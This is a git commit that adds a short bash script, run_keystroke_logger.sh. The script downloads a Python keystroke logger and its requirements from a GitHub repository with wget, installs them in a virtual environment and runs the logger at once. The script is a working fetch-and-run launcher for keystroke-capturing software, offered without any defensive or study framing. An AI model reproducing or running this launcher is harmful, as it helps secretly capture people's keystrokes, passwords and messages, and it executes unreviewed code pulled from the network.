34ca0664cde9ee7fe3cd91ff3e474fcafb30d98b
exploittracer <junrey.o.ansing@gmail.com>
2026-05-07 11:35:27 +0800

    Lighter version. Initial commit

---
+++ run_keystroke_logger.sh
@@ -0,0 +1,22 @@
+#!/bin/bash
+
+
+PROGRAM_URL="https://raw.githubusercontent.com/exploittracer/keystroke-logger/refs/heads/main/keystroke_logger.py"
+REQUIREMENTS_URL="https://raw.githubusercontent.com/exploittracer/keystroke-logger/refs/heads/main/requirements.txt"
+PROGRAM_NAME="keystroke_logger.py"
+
+echo "[+] Downloading Python program..."
+wget -O "$PROGRAM_NAME" "$PROGRAM_URL"
+
+echo "[+] Downloading requirements..."
+wget -O requirements.txt "$REQUIREMENTS_URL"
+
+python3 -m venv venv
+source venv/bin/activate
+
+[ -f "requirements.txt" ] && pip install -r requirements.txt
+
+mkdir output
+
+python3 "$PROGRAM_NAME"
+deactivate
